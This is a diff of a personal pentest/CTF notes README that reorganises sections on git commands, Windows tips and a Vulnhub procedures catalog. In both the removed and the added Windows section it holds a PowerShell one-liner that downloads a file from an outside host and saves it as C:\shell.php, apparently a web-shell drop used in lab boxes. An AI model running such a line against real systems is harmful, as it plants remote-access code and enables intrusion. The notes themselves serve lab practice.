@@ -1,147 +1,11 @@
-Personal-Notes - example of how to take and store notes on github (copy this template) 
+Personal-Notes
 ===========================
 
+> Example of how to take and store notes on github (copy this template) 
+
 ## Catalog
-<li><a href="#vulnhub">VULNHUB - Box Writeups</a></li>
-<li><a href="#git-and-github">Git and Github</a></li>
-<li><a href="#windows">Windows</a></li>
-
-
-
-# <div  align="left">**GIT AND GITHUB**</div>
-## Configuration
-```
-git config global user.name 'hackername'
-git config global user.email 'hackeremail@gmail.com'
-```
-
-## Storing credentials 
-```
-git config credential.helper store
-```
-
-## Commands
-### Setting up after making a repository
-Most used
-```
-echo "# demo" >> README.md
-git init
-git add *
-git commit -m "first commit"
-git branch -M main
-git remote add origin https://github.com/hackername/demo.git
-git push -u origin main
-```
-
-
-Creating a first repository
-```
-create a new repository on the command line
-
-    echo "# demo" >> README.md
-    git init
-    git add README.md
-    git commit -m "first commit"
-    git branch -M main
-    git remote add origin https://github.com/hackername/demo.git
-    git push -u origin main
-
-push an existing repository from the command line
-
-    git remote add origin https://github.com/hackername/demo.git
-    git branch -M main
-    git push -u origin main
-```
-
-### General Commands
-```
-echo 'First readme file ' > README.md
-git init
-git add README.md
-git commit -m 'first commit'
-git remote - Checks for remote repositories
-git remote add origin https://github.com/hackername/sample.git
-git push -u origin main/master
-git remote remove unwantedremote
-git push
-git pull
-git log
-git init - initalises a local git repository in a folder by creating a .git folder
-git add filename - Adds file to the index
-git status -   Checks the status of the workiing tree or staging area
-git rm cached filename - Removes a file from the staging area
-git commit - Commits changes to the index
-git commit -m 'Commit message goes here'  => Commiting without the editing part
-git push - Pushes to the remote repository
-git pull - Pulls latest changes ffrom remote repository
-git clone - Clones a repository into a new folder
-.gitignore file - Add the name of the file in this file and that file will be ignore during commits (e.g log files)
-```
-
-### Branches
-```
-git branch newbranch - Creates a new branch
-git checkout newbranch - Changes to that branch
-git branch -vv
-git branch -d dev -delete dev branch
-Add or make changed
-git add .
-git commit -m 'Login added'
-git status - Check if changes were made and staging area is empty
-git checkout master - Switch back to master.login.html and stuff in the login         branch vanishes
-git push   => Pushes any changes made
-git merge login(while in master branch)
-```
-
-### Storage locations and important files
-```
-.git/logs/refs/heads/master => commits file
-.git/logs/HEAD
-
-.git/index
-git reset hard HEAD~1 => Undo commits one by one
-```
-
-### Restoration of deleted files
-```
-git log - Getting the commit log 
-```
-Restoring to a certain commit(sha hash)
-```
-git reset hard d02966ddfbab01d06e853b4e35e57c550c751363
-```
-
-### Git Hooks
-```
-In git there are scripts called git hooks which can run automatically before or after git actions like commits. You can configure them in .git/hooks. For this case I’ll use post-merge since when git pull is run a merge action is done.
-```
-
- 
-<br/>
-
-# <div  align="left">**WINDOWS**</div>
-## GENERAL COMMANDS
-Downloading a file with powershell
-```
-    powershell -Command "$c=new-object System.Net.WebClient;$c.DownloadFile('http://file.kaibro.tw/s','C:\shell.php')"
-
-```
-
-Repairing boot drive
-```
-navigate too boot with cmd
-bddedit // to view
-bcdedit /f /delete {xxxxxxxx}
-
-bcdboot c:\windows
-```  
-
-
-
-<br/>
-
-# <div  align="left">**VULNHUB**</div>
-## Catalog
+* [Git and Github](#git-and-github)
+* [Windows](#windows)
 * [CTF-tips](#tips-and-tricks)
 * [Operating procedures](#operating-procedures)
 * [HTTP procedures](#http)
@@ -151,6 +15,83 @@ bcdboot c:\windows
 * [Samba procedures](#samba)
 * [Forensics procedures](#forensics)
 * [After Initial Access procedures](#after-gaining-access)
+
+
+### Windows
+* `Downloading a file with powershell`
+	```
+	powershell -Command "$c=new-object System.Net.WebClient;$c.DownloadFile('http://file.kaibro.tw/s','C:\shell.php')"
+	```
+
+*`Repairing boot drive`
+	```
+	navigate too boot with cmd
+	bddedit // to view
+	bcdedit /f /delete {xxxxxxxx}
+	bcdboot c:\windows
+	```  
+
+### Git and Github
+* `Creating a first repository`
+	* create a new repository on the command line
+	```
+	echo "# demo" >> README.md
+	git init
+	git add README.md
+	git commit -m "first commit"
+	git branch -M main
+	git remote add origin https://github.com/hackername/demo.git
+	git push -u origin main
+	```
+
+	* push an existing repository from the command line
+	```
+	git remote add origin https://github.com/hackername/demo.git
+	git branch -M main
+	git push -u origin main
+	```
+
+
+* `Branches`
+	```
+	git branch newbranch - Creates a new branch
+	git checkout newbranch - Changes to that branch
+	git branch -vv
+	git branch -d dev -delete dev branch
+	Add or make changed
+	git add .
+	git commit -m 'Login added'
+	git status - Check if changes were made and staging area is empty
+	git checkout master - Switch back to master.login.html and stuff in the login         branch vanishes
+	git push   => Pushes any changes made
+	git merge login(while in master branch)
+	```
+
+
+* `General Commands`
+	```
+	echo 'First readme file ' > README.md
+	git init
+	git add README.md
+	git commit -m 'first commit'
+	git remote - Checks for remote repositories
+	git remote add origin https://github.com/hackername/sample.git
+	git push -u origin main/master
+	git remote remove unwantedremote
+	git push
+	git pull
+	git log
+	git init - initalises a local git repository in a folder by creating a .git folder
+	git add filename - Adds file to the index
+	git status -   Checks the status of the workiing tree or staging area
+	git rm cached filename - Removes a file from the staging area
+	git commit - Commits changes to the index
+	git commit -m 'Commit message goes here'  => Commiting without the editing part
+	git push - Pushes to the remote repository
+	git pull - Pulls latest changes ffrom remote repository
+	git clone - Clones a repository into a new folder
+	.gitignore file - Add the name of the file in this file and that file will be ignore during commits (e.g log files)
+	```
 
 ### Tips and Tricks
 * `tips`
